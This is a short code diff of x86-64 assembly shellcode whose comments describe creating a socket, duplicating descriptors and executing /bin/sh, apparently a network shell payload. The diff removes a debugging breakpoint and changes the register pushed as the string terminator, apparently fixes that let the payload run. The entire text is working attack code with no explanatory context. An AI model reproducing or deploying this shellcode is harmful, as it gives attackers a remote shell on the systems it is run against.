@@ -33,7 +33,6 @@
 
     bits    64
     
-    int3
     ; step 1, create a socket
     ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
     push    41
@@ -85,7 +84,7 @@ dup_loop64:
     ; step 6, execute /bin/sh
     ; execve("/bin//sh", NULL, NULL);
     xor     esi, esi         ; rsi = 0
-    push    rdx              ; zero terminator
+    push    rax              ; zero terminator
     mov     rcx, '/bin//sh'
     push    rcx
     push    rsp
